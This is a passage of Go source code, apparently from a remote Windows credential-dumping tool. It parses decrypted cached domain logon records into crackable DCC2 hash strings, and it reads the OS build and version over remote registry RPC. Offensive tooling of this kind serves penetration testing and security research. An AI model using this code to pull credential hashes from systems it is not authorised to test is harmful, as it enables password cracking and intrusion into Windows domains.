			plaintext = plaintext[0x48:]
			userName, err := encoder.FromUnicodeString(plaintext[:nl_record.UserLength])
			if err != nil {
				log.Errorln(err)
				continue
			}
			plaintext = plaintext[int(pad64(uint64(nl_record.UserLength)))+int(pad64(uint64(nl_record.DomainNameLength))):]
			domainLong, err := encoder.FromUnicodeString(plaintext[:int(pad64(uint64(nl_record.DnsDomainNameLength)))])
			if err != nil {
				log.Errorln(err)
				continue
			}

			if VistaStyle {
				answer = fmt.Sprintf("%s/%s:$DCC2$%d#%s#%x", domainLong, userName, iterationCount, userName, encHash)
			} else {
				answer = fmt.Sprintf("%s/%s:%x:%s", domainLong, userName, encHash, userName)
			}
			result = append(result, answer)
		} else {
			//golog.Debugf("Unhandled case with NIL IV and likely empty cache record for DCC2Cache %s\n", name)
			continue
		}
	}
	return
}

func GetOSVersionBuild(rpccon *msrrp.RPCCon, base []byte) (build int, version float64, err error) {
	hSubKey, err := rpccon.OpenSubKey(base, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`)
	if err != nil {
		log.Noticef("Failed to open registry key CurrentVersion with error: %v\n", err)
		return
	}
	defer rpccon.CloseKeyHandle(hSubKey)

	value, err := rpccon.QueryValueString(hSubKey, "CurrentBuild")
	if err != nil {
		log.Errorln(err)
		return
	}
	buildStr := string(value)
	build, err = strconv.Atoi(buildStr)
	if err != nil {
		log.Errorln(err)
		return
	}

	value, err = rpccon.QueryValueString(hSubKey, "CurrentVersion")
	if err != nil {
		log.Errorln(err)
		return
	}
	versionStr := string(value)
	version, err = strconv.ParseFloat(versionStr, 32)
	if err != nil {
		log.Errorf("Failed to get CurrentVersion with error: %v\n", err)
		return
	}

	return
}
